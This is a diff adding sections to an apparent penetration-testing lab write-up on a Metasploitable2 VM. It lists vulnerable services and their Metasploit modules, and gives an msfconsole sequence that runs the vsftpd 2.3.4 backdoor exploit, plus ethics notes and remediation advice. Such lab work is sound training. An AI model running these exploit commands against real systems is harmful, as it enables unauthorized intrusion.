@@ -23,3 +23,31 @@ nmap -sV -sC -Pn 192.168.1.4
 | 5900/tcp | VNC       | Protocol 3.3        | Weak/no auth                           | `vncviewer`, Hydra                       |
 | 6667/tcp | IRC       | UnrealIRCd          | Backdoor RCE                           | Metasploit (`unreal_ircd_3281_backdoor`) |
 | 8180/tcp | Tomcat    | Tomcat 5.5          | Default creds, RCE                     | `tomcat_mgr_deploy`                      |
+
+---
+
+##  Example Exploitation
+
+###  FTP Backdoor Exploit (vsftpd 2.3.4)
+```bash
+msfconsole
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 192.168.1.4
+run
+```
+---
+
+##  Notes
+
+- This VM is intentionally vulnerable (Metasploitable2).
+- Do **not** test these techniques on real-world systems without permission.
+- This lab is for **ethical learning** purposes only.
+---
+
+##  Recommendations
+
+| Risk Level | Action |
+|------------|--------|
+| 🔴 Critical | Remove `vsftpd 2.3.4`, UnrealIRCd, bind shells |
+| 🟡 Medium   | Disable Telnet, update Samba, MySQL, PostgreSQL |
+| 🟢 Low      | Upgrade Apache, remove unused services           |
